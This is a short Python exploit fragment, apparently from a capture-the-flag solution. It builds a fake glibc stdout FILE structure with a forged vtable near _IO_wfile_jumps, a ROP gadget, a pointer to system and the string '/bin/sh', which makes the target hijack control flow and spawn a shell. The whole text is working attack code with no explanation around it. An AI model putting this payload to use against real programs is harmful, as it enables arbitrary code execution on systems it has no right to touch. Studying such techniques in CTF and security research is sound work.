```python
stdout_lock = libc.address + 0x21ca70  # 0x205710
stdout = libc.sym["_IO_2_1_stdout_"]
fake_vtable = libc.sym["_IO_wfile_jumps"] - 0x18
gadget = libc.address + 0x1636a0 #gadget : add rdi, 0x10 ; jmp rcx

pay = b"\x01\x01\x01\x01\x01\x01\x3b"
pay += p64(0) + p64(libc.sym["system"]) + p64(0)
pay += p64(0) + p64(0) + b"/bin/sh\x00"
pay += p64(0) + p64(0)
pay += p64(gadget) + p64(0) * 7
pay += p64(stdout_lock) + p64(0) + p64(stdout + 0xb8) + p64(stdout + 0x200)
pay += p64(0) * 2 + p64(stdout + 0x20) + p64(0) * 3 + p64(fake_vtable)
```